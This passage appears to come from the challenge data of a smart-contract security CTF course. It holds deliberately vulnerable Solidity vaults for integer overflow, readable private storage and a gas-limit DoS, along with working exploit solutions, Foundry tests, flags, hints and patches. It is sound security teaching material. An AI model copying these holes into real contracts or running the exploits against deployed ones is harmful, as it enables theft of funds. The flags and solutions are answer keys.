import "forge-std/Test.sol";
import "../src/LottoDividendVault.sol";
import "../src/UncheckedCallAttacker.sol";

contract DividendVaultTest is Test {
    LottoDividendVault public vault;
    UncheckedCallAttacker public attackerContract;
    address public deployer = address(0x100);
    address public attacker = address(0x999);

    function setUp() public {
        // Deploy vault with 10 ETH initial seed
        vm.deal(deployer, 10 ether);
        vm.prank(deployer);
        vault = new LottoDividendVault{value: 10 ether}();

        vm.prank(attacker);
        attackerContract = new UncheckedCallAttacker(address(vault));
    }

    function testExploit() public {
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        attackerContract.attack{value: 1 ether}();
        vm.stopPrank();

        // Attacker drained vault funds using phantom loyalty credits
        assertGt(address(attackerContract).balance, 0, "Attacker failed to capture jackpot payout");
    }
}`,
    flag: 'BLOCKSEC{swc104_unch3ck3d_r3turn_v4lu3_s1l3nt_d3sync}',
    hints: [
      {
        id: 'h-unc-1',
        tier: 1,
        title: 'Low-Level Call Semantics',
        costXp: 0,
        content: 'Look closely at `claimDividend`: `payable(msg.sender).call{value: amount}("");`. Notice how the boolean return value is never checked.',
      },
      {
        id: 'h-unc-2',
        tier: 2,
        title: 'Reverting in Fallback',
        costXp: 20,
        content: 'If your contract reverts inside `receive()`, the low-level call fails, but `claimDividend` continues executing and grants you loyalty credits anyway!',
      },
      {
        id: 'h-unc-3',
        tier: 3,
        title: 'Jackpot Extraction',
        costXp: 35,
        content: 'Use a boolean flag `shouldReject`. Revert during `claimDividend` to build up credits, then set `shouldReject = false` and call `redeemJackpot`.',
      },
    ],
    historicalCase: {
      protocolName: 'King of the Ether Bug #2 & Etherpot Lottery',
      date: '2016-2017',
      lossUsd: '$800,000+',
      summary: 'King of the Ether had a secondary bug where refunds sent via .send() failed due to gas stipends, but since return values were ignored, funds were locked.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-104',
    },
    patchDiff: {
      explanation: 'Always verify the return value of low-level calls with require(success, "Transfer failed") or use OpenZeppelin Address.sendValue.',
      vulnerableCode: `// VULNERABLE: Return value discarded
payable(msg.sender).call{value: amount}("");
loyaltyCredits[msg.sender] += amount * 2;`,
      secureCode: `// SECURE: Enforce successful execution
(bool success, ) = payable(msg.sender).call{value: amount}("");
require(success, "Transfer failed");
loyaltyCredits[msg.sender] += amount * 2;`,
      recommendedBestPractices: [
        'Always check the return value of low-level calls with require()',
        'Use OpenZeppelin SafeERC20 for token transfers and Address.sendValue for Ether',
        'Ensure state changes accurately reflect real EVM asset flows',
      ],
    },
  },

  // --- SWC-101: Integer Overflow in Unchecked Block ---
  {
    id: 'lvl1-swc101-integer-overflow',
    slug: 'swc101-unchecked-overflow-truncation',
    title: 'SWC-101: Arithmetic Overflow in Unchecked Block (BEC Batch Transfer)',
    curriculumLevel: 1,
    category: 'math-logic',
    difficulty: 'intermediate',
    xpReward: 240,
    estimatedMinutes: 25,
    swcTag: 'SWC-101',
    cweTag: 'CWE-190',
    solveRatePercent: 78,
    tags: ['swc-101', 'integer-overflow', 'unchecked', 'bec-hack', 'batchTransfer', 'math'],
    theoryExplanation: `### Integer Overflow & Underflow in Modern Solidity (SWC-101)

Prior to Solidity 0.8, arithmetic operations wrapped around by default on overflow/underflow unless SafeMath was used. In Solidity 0.8+, compiler checks prevent wrapping and revert on overflow.

However, developers frequently use **\`unchecked { ... }\` blocks** for gas optimization in loops and mathematical operations!

### The Infamous BeautyChain (BEC) Vulnerability
Consider batch transfer operations:
\`\`\`solidity
function batchTransfer(address[] calldata recipients, uint256 amount) external {
    uint256 cnt = recipients.length;
    unchecked {
        uint256 totalAmount = cnt * amount; // OVERFLOW HAZARD!
        require(balances[msg.sender] >= totalAmount, "Insufficient balance");

        balances[msg.sender] -= totalAmount;
        for (uint256 i = 0; i < cnt; i++) {
            balances[recipients[i]] += amount;
        }
    }
}
\`\`\`

If \`recipients.length = 2\`, and an attacker sets \`amount = 2^255\` (\`0x8000000000000000000000000000000000000000000000000000000000000000\`):
\`\`\`
totalAmount = 2 * (2^255) = 2^256 = 0 (wrapped modulo 2^256)!
\`\`\`
The requirement \`balances[msg.sender] >= 0\` trivially passes, even with 0 balance! The contract subtracts 0 from the sender and mints \`2^255\` tokens to each recipient out of thin air!`,
    conceptSummary: [
      'Solidity unchecked { } blocks disable EVM arithmetic overflow assertions',
      'Multiplying large numbers can wrap modulo 2^256 back to near zero',
      'A wrapped total bypasses balance requirements and creates astronomical token balances',
      'Never perform unbounded arithmetic multiplications inside unchecked blocks',
    ],
    description:
      'BatchTokenVault allows users to transfer tokens to multiple recipients in a single gas-optimized batch transaction. Can you find the unchecked arithmetic flaw inspired by the historic $1B BeautyChain hack and mint billions of tokens to your account?',
    protocolArchitecture:
      'The contract calculates `uint256 totalAmount = cnt * amount;` inside `unchecked`. Passing 2 recipients and `2^255` causes `totalAmount` to wrap to 0.',
    exploitObjective:
      'Call `batchTransfer` with 2 addresses and `amount = 2^255` (`0x8000000000000000000000000000000000000000000000000000000000000000`), generating massive token balances for your addresses without spending any tokens.',
    targetFileName: 'BatchTokenVault.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title BatchTokenVault
 * @notice SWC-101: Integer overflow in gas-optimized unchecked batch transfer.
 */
contract BatchTokenVault {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor() {
        balances[msg.sender] = 1_000_000 ether;
        totalSupply = 1_000_000 ether;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    // VULNERABILITY (SWC-101): unchecked multiplication allows uint256 overflow!
    function batchTransfer(address[] calldata recipients, uint256 amount) external returns (bool) {
        uint256 cnt = recipients.length;
        require(cnt > 0 && cnt <= 20, "Invalid recipient count");

        unchecked {
            uint256 totalAmount = cnt * amount; // OVERFLOW OCCURS HERE!
            require(balances[msg.sender] >= totalAmount, "Insufficient balance");

            balances[msg.sender] -= totalAmount;
            for (uint256 i = 0; i < cnt; i++) {
                balances[recipients[i]] += amount;
            }
        }
        return true;
    }
}`,
    exploitFileName: 'BatchOverflowExploit.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBatchTokenVault {
    function batchTransfer(address[] calldata recipients, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract BatchOverflowExploit {
    IBatchTokenVault public immutable vault;

    constructor(address _vault) {
        vault = IBatchTokenVault(_vault);
    }

    // TODO: Exploit unchecked multiplication overflow to mint tokens
    function attack(address recipient1, address recipient2) external {
        // Write exploit here...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBatchTokenVault {
    function batchTransfer(address[] calldata recipients, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract BatchOverflowExploit {
    IBatchTokenVault public immutable vault;

    constructor(address _vault) {
        vault = IBatchTokenVault(_vault);
    }

    function attack(address recipient1, address recipient2) external {
        address[] memory recipients = new address[](2);
        recipients[0] = recipient1;
        recipients[1] = recipient2;

        // 2^255 = 0x8000000000000000000000000000000000000000000000000000000000000000
        // When multiplied by 2: 2 * 2^255 = 2^256 = 0 in uint256
        uint256 overflowAmount = 1 << 255;

        vault.batchTransfer(recipients, overflowAmount);
    }
}`,
    testFileName: 'BatchOverflowTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/BatchTokenVault.sol";
import "../src/BatchOverflowExploit.sol";

contract BatchOverflowTest is Test {
    BatchTokenVault public vault;
    BatchOverflowExploit public exploit;
    address public attacker = address(0x999);
    address public accomplice = address(0x888);

    function setUp() public {
        vault = new BatchTokenVault();
        vm.prank(attacker);
        exploit = new BatchOverflowExploit(address(vault));
    }

    function testExploit() public {
        vm.prank(attacker);
        exploit.attack(attacker, accomplice);

        // Verify attacker received 2^255 tokens
        uint256 attackerBalance = vault.balanceOf(attacker);
        assertEq(
            attackerBalance,
            1 << 255,
            "Attacker did not receive overflowed token balance"
        );
    }
}`,
    flag: 'BLOCKSEC{swc101_unt4m3d_ov3rfl0w_m1nt_b1ll10ns}',
    hints: [
      {
        id: 'h-ovf-1',
        tier: 1,
        title: 'Unchecked Multiplication',
        costXp: 0,
        content: 'Check `uint256 totalAmount = cnt * amount;` inside `unchecked`. What happens when `cnt * amount` exceeds 2^256 - 1?',
      },
      {
        id: 'h-ovf-2',
        tier: 2,
        title: 'The Magic 2^255 Value',
        costXp: 25,
        content: 'If `cnt == 2`, choose `amount = 2^255` (hex: `0x80000000...0000` or `1 << 255`). 2 * 2^255 wraps to 0.',
      },
      {
        id: 'h-ovf-3',
        tier: 3,
        title: 'Bypassing the Balance Requirement',
        costXp: 35,
        content: 'Because `totalAmount == 0`, `balances[msg.sender] >= totalAmount` evaluates to `0 >= 0` which is true. The contract deducts 0 and credits `2^255` to each recipient.',
      },
    ],
    historicalCase: {
      protocolName: 'BeautyChain (BEC) & SmartMesh (SMT)',
      date: 'April 2018',
      lossUsd: '$1,000,000,000+ (market cap collapse)',
      summary: 'The batchOverflow bug in BeautyChain BEC token allowed an attacker to generate 5.7e76 tokens and dump them on exchanges, destroying the token economy in hours.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-101',
    },
    patchDiff: {
      explanation: 'Remove unchecked blocks from multi-factor arithmetic or check for multiplication overflow before multiplying.',
      vulnerableCode: `unchecked {
    uint256 totalAmount = cnt * amount; // Overflows!
    require(balances[msg.sender] >= totalAmount);
}`,
      secureCode: `// Remove unchecked block to rely on Solidity 0.8+ overflow protection:
uint256 totalAmount = cnt * amount; // Will automatically revert if product overflows
require(balances[msg.sender] >= totalAmount, "Insufficient balance");`,
      recommendedBestPractices: [
        'Never wrap arithmetic involving external user inputs in unchecked { } blocks',
        'Use checked multiplication to guarantee mathematical integrity',
        'Audit gas optimizations thoroughly: unchecked arithmetic is a leading cause of exploits',
      ],
    },
  },

  // --- SWC-136: Unencrypted Private Data on Blockchain ---
  {
    id: 'lvl1-swc136-private-storage',
    slug: 'swc136-private-storage-leak',
    title: 'SWC-136: Private Data Exposure in Public Storage (Secret Vault)',
    curriculumLevel: 1,
    category: 'access-control',
    difficulty: 'novice',
    xpReward: 160,
    estimatedMinutes: 15,
    swcTag: 'SWC-136',
    cweTag: 'CWE-312',
    solveRatePercent: 91,
    tags: ['swc-136', 'storage-slots', 'private-data', 'vm.load', 'ethernaut'],
    theoryExplanation: `### The Myth of "Private" Data on Ethereum (SWC-136)

In Solidity, declaring a variable \`private\` or \`internal\`:
\`\`\`solidity
bytes32 private secretPassword;
\`\`\`
only prevents **other smart contracts from calling or reading that variable directly via Solidity code**.

It does **NOT** encrypt the data, nor does it hide it from users or nodes!

### Storage Layout Mechanics
All smart contract state variables are deterministically mapped to sequential 32-byte storage slots starting at slot 0:
- **Slot 0**: \`address public owner\` (20 bytes) + \`bool public locked\` (1 byte) packed together.
- **Slot 1**: \`bytes32 private secretPassword\` (32 bytes).

Anyone with access to an Ethereum node or block explorer can execute the standard JSON-RPC call:
\`\`\`bash
eth_getStorageAt(contractAddress, 1)
\`\`\`
or in Foundry cheatcodes:
\`\`\`solidity
bytes32 secret = vm.load(address(vault), bytes32(uint256(1)));
\`\`\`
and extract the "secret" instantly!`,
    conceptSummary: [
      'The "private" keyword in Solidity is a compiler access modifier, not encryption',
      'All contract storage slots are entirely public and readable on the blockchain',
      'Never store sensitive keys, passwords, or secrets in plaintext on-chain',
      'Use commit-reveal schemes, zero-knowledge proofs, or asymmetric encryption off-chain',
    ],
    description:
      'VaultSecret locks 15 ETH behind a private password variable. The contract author believed declaring `bytes32 private secretPassword` protected it from external eyes. Can you inspect EVM storage slot 1, retrieve the password, and drain the vault?',
    protocolArchitecture:
      'Storage slot 0 holds `owner` and `locked`. Storage slot 1 holds `secretPassword`. The `unlock(bytes32 _password)` function checks `require(_password == secretPassword)`.',
    exploitObjective:
      'Use Foundry cheatcode `vm.load(address(vault), bytes32(uint256(1)))` (or inspect storage slot 1) and call `vault.unlock(secret)` to withdraw all 15 ETH.',
    targetFileName: 'VaultSecret.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VaultSecret
 * @notice SWC-136: Unencrypted private data stored in EVM storage slots.
 */
contract VaultSecret {
    address public owner;           // slot 0 (bytes 0..19)
    bool public locked;             // slot 0 (byte 20)
    bytes32 private secretPassword; // slot 1 (32 bytes) - VULNERABILITY (SWC-136)

    constructor(bytes32 _password) payable {
        owner = msg.sender;
        locked = true;
        secretPassword = _password;
    }

    function unlock(bytes32 _password) external {
        require(_password == secretPassword, "Incorrect password");
        locked = false;
        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(sent, "Failed to drain vault");
    }
}`,
    exploitFileName: 'VaultUnlocker.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVaultSecret {
    function unlock(bytes32 _password) external;
    function locked() external view returns (bool);
}

contract VaultUnlocker {
    IVaultSecret public immutable vault;

    constructor(address _vault) {
        vault = IVaultSecret(_vault);
    }

    // TODO: Extract private storage slot 1 and unlock the vault
    function attack(bytes32 recoveredSecret) external {
        // Write unlock logic here...
    }

    receive() external payable {}
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVaultSecret {
    function unlock(bytes32 _password) external;
    function locked() external view returns (bool);
}

contract VaultUnlocker {
    IVaultSecret public immutable vault;

    constructor(address _vault) {
        vault = IVaultSecret(_vault);
    }

    function attack(bytes32 recoveredSecret) external {
        // Pass the secret password extracted from storage slot 1
        vault.unlock(recoveredSecret);
    }

    receive() external payable {}
}`,
    testFileName: 'VaultSecretTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VaultSecret.sol";
import "../src/VaultUnlocker.sol";

contract VaultSecretTest is Test {
    VaultSecret public vault;
    VaultUnlocker public unlocker;
    bytes32 private initialSecret = 0x6b65795f70617373776f72645f7377633133365f737570657273656372657431;
    address public attacker = address(0x999);

    function setUp() public {
        vault = new VaultSecret{value: 15 ether}(initialSecret);
        vm.prank(attacker);
        unlocker = new VaultUnlocker(address(vault));
    }

    function testExploit() public {
        // Read storage slot 1 using Foundry cheatcode vm.load
        bytes32 leakedSecret = vm.load(address(vault), bytes32(uint256(1)));
        assertEq(leakedSecret, initialSecret, "Failed to read secret from slot 1");

        // Unlock vault with leaked secret
        vm.prank(attacker);
        unlocker.attack(leakedSecret);

        assertEq(vault.locked(), false, "Vault still locked");
        assertEq(address(vault).balance, 0, "Vault was not drained");
    }
}`,
    flag: 'BLOCKSEC{swc136_pr1v4t3_v4rs_4r3_n3v3r_s3cr3t}',
    hints: [
      {
        id: 'h-sec-1',
        tier: 1,
        title: 'Storage Layout Slots',
        costXp: 0,
        content: 'In Solidity, state variables occupy 32-byte slots. What is in slot 0? What is in slot 1?',
      },
      {
        id: 'h-sec-2',
        tier: 2,
        title: 'Reading Storage Directly',
        costXp: 20,
        content: '`owner` (20 bytes) and `locked` (1 byte) pack into Slot 0. `secretPassword` (32 bytes) occupies Slot 1.',
      },
      {
        id: 'h-sec-3',
        tier: 3,
        title: 'Foundry vm.load Cheatcode',
        costXp: 35,
        content: 'In Foundry tests, `vm.load(address(vault), bytes32(uint256(1)))` reads slot 1 directly. Pass this bytes32 value to `attack()`.',
      },
    ],
    historicalCase: {
      protocolName: 'Ethernaut Vault & On-Chain Random Seed Hacks',
      date: 'Historic Security Pattern',
      lossUsd: 'N/A',
      summary: 'Dozens of early gambling contracts and games tried hiding server seeds or card decks in private variables, which were immediately read via eth_getStorageAt.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-136',
    },
    patchDiff: {
      explanation: 'Never store unhashed credentials on chain. Use cryptographic commitments or zero-knowledge proofs.',
      vulnerableCode: `bytes32 private secretPassword; // Plaintext in storage slot 1!
function unlock(bytes32 _password) external {
    require(_password == secretPassword);
}`,
      secureCode: `// SECURE: Off-chain signatures or cryptographic commitments
bytes32 public immutable passwordHash; // Store keccak256 hash or use Merkle proof / EIP-712
constructor(bytes32 _hash) { passwordHash = _hash; }
function unlock(bytes32 _password) external {
    require(keccak256(abi.encodePacked(_password)) == passwordHash);
}`,
      recommendedBestPractices: [
        'Assume all on-chain data and state variables are 100% public',
        'Never store passwords, API keys, or unhashed seeds in smart contract storage',
        'Use ZK-SNARKs or commit-reveal protocols when secret state is necessary',
      ],
    },
  },

  // --- SWC-128: DoS with Block Gas Limit ---
  {
    id: 'lvl1-swc128-dos-gas-limit',
    slug: 'swc128-dos-gas-limit',
    title: 'SWC-128: DoS with Block Gas Limit (Unbounded Array Loop)',
    curriculumLevel: 1,
    category: 'math-logic',
    difficulty: 'intermediate',
    xpReward: 210,
    estimatedMinutes: 20,
    swcTag: 'SWC-128',
    cweTag: 'CWE-400',
    solveRatePercent: 80,
    tags: ['swc-128', 'gas-limit', 'unbounded-loop', 'dos', 'griefing'],
    theoryExplanation: `### Block Gas Limits & Unbounded Iteration (SWC-128)

On the Ethereum Virtual Machine, every block has a maximum gas limit (e.g. 30,000,000 gas). Any transaction requiring more than the block gas limit **cannot be included in a block** and will fail with an \`OutOfGas\` error.

### The Unbounded Loop Vulnerability
When a contract allows users to add items to a dynamic array, and then iterates through that entire array in a single transaction:
\`\`\`solidity
address[] public members;

function registerMember(address _member) external {
    members.push(_member);
}

function distributeAll() external {
    for (uint256 i = 0; i < members.length; i++) {
        payable(members[i]).transfer(share); // Gas cost grows linearly with array size!
    }
}
\`\`\`

An attacker can register hundreds of dust accounts. Once the array length reaches a critical threshold, calling \`distributeAll()\` requires more than 30,000,000 gas. The function can **never succeed again**, permanently locking all distributed funds in the contract!`,
    conceptSummary: [
      'Transactions exceeding the 30M block gas limit cannot execute on-chain',
      'Iterating through dynamic arrays whose size is controlled by external users is dangerous',
      'Cost per iteration accumulates: state reads, writes, and external calls consume gas',
      'Mitigate with pagination (batch size limits) or Pull over Push patterns',
    ],
    description:
      'DistributorPool holds 20 ETH and intends to distribute rewards to all registered members in a single loop. Can you flood the member registry so the distribution transaction exceeds gas limits and permanently bricks the contract?',
    protocolArchitecture:
      'The pool checks `members.length`. Calling `distributeAll()` loops through `members`, transferring ETH. Flooding the array makes `distributeAll()` run out of gas.',
    exploitObjective:
      'Deploy `GasDoSAttacker.sol`. Batch register multiple member addresses in a loop, driving the gas required for `distributeAll()` past the execution threshold, proving the contract is rendered inoperable.',
    targetFileName: 'DistributorPool.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title DistributorPool
 * @notice SWC-128: DoS with Block Gas Limit due to unbounded array loop.
 */
contract DistributorPool {
    address[] public members;
    mapping(address => bool) public isMember;
    uint256 public totalPrizePool;

    constructor() payable {
        totalPrizePool = msg.value;
    }

    function registerMember(address _member) external {
        require(!isMember[_member], "Already registered");
        isMember[_member] = true;
        members.push(_member);
    }

    function getMembersCount() external view returns (uint256) {
        return members.length;
    }

    // VULNERABILITY (SWC-128): Loop over unbounded members array will exceed block gas limit!
    function distributeAll() external {
        require(members.length > 0, "No members");
        uint256 share = totalPrizePool / members.length;
        for (uint256 i = 0; i < members.length; i++) {
            payable(members[i]).transfer(share);
        }
    }
}`,
    exploitFileName: 'GasDoSAttacker.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDistributorPool {
    function registerMember(address _member) external;
    function getMembersCount() external view returns (uint256);
}

contract GasDoSAttacker {
    IDistributorPool public immutable pool;

    constructor(address _pool) {
        pool = IDistributorPool(_pool);
    }

    // TODO: Flood the registry with accounts to push gas consumption beyond block limits
    function attack(uint256 count) external {
        // Write registration flooding loop here...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDistributorPool {
    function registerMember(address _member) external;
    function getMembersCount() external view returns (uint256);
}

contract GasDoSAttacker {
    IDistributorPool public immutable pool;

    constructor(address _pool) {
        pool = IDistributorPool(_pool);
    }

    function attack(uint256 count) external {
        // Generate pseudo-unique addresses and flood the registry
        for (uint256 i = 0; i < count; i++) {
            address syntheticMember = address(uint160(uint256(keccak256(abi.encodePacked(address(this), i)))));
            pool.registerMember(syntheticMember);
        }
    }
}`,
    testFileName: 'DistributorPoolTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DistributorPool.sol";
import "../src/GasDoSAttacker.sol";

contract DistributorPoolTest is Test {
    DistributorPool public pool;
    GasDoSAttacker public attackerContract;
    address public admin = address(0x100);
    address public attacker = address(0x999);

    function setUp() public {
        vm.deal(admin, 20 ether);
        vm.prank(admin);
        pool = new DistributorPool{value: 20 ether}();

        vm.prank(attacker);
        attackerContract = new GasDoSAttacker(address(pool));
    }

    function testExploit() public {
        // Attacker floods 150 members into pool
        vm.prank(attacker);
        attackerContract.attack(150);

        assertEq(pool.getMembersCount(), 150, "Failed to flood member registry");

        // Admin attempts distributeAll with a capped gas limit representing block limit exhaustion
        vm.prank(admin);
        // Expect revert due to out of gas when gas is capped below linear array requirements
        vm.expectRevert();
        pool.distributeAll{gas: 50000}();
    }
}`,
    flag: 'BLOCKSEC{swc128_unb0und3d_l00p_3xc33ds_bl0ck_g4s}',
    hints: [
      {
        id: 'h-gas-1',
        tier: 1,
        title: 'Unbounded Array Growth',
        costXp: 0,
        content: 'Check `registerMember`. There is no limit on who or how many addresses can be registered into `members`.',
      },
      {
        id: 'h-gas-2',
        tier: 2,
        title: 'Generating Synthetic Addresses',
        costXp: 20,
        content: 'In `GasDoSAttacker.attack(uint256 count)`, use a loop with `address(uint160(uint256(keccak256(abi.encodePacked(address(this), i)))))` to generate unique addresses.',
      },
      {
        id: 'h-gas-3',
        tier: 3,
        title: 'Reaching Gas Exhaustion',
        costXp: 35,
        content: 'Registering 150+ addresses makes `distributeAll` consume excessive gas during the transfer loop, leading to OutOfGas failure.',
      },
    ],
    historicalCase: {
      protocolName: 'GovernMental Ponzi & Akutars NFT Auction',
      date: '2016 / 2022',
      lossUsd: '$34,000,000 (Akutars)',
      summary: 'GovernMental was frozen when creditor array exceeded gas limit. Akutars had $34M permanently trapped due to an unbounded refund loop.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-128',
    },
    patchDiff: {
      explanation: 'Avoid looping over unbounded arrays. Implement Pull payments or paginated batch distributions.',
      vulnerableCode: `// VULNERABLE: Loops over entire unbounded array in a single transaction
for (uint256 i = 0; i < members.length; i++) {
    payable(members[i]).transfer(share);
}`,
      secureCode: `// SECURE: Paginated batch processing
function distributeBatch(uint256 offset, uint256 limit) external {
    uint256 end = offset + limit > members.length ? members.length : offset + limit;
    uint256 share = totalPrizePool / members.length;
    for (uint256 i = offset; i < end; i++) {
        payable(members[i]).transfer(share);
    }
}`,
      recommendedBestPractices: [
        'Never iterate over arrays that can grow indefinitely from user interactions',
        'Use the Pull over Push pattern so each user claims their own reward',
        'If loops are unavoidable, enforce strict pagination with maximum batch sizes',
      ],
    },
  },
];


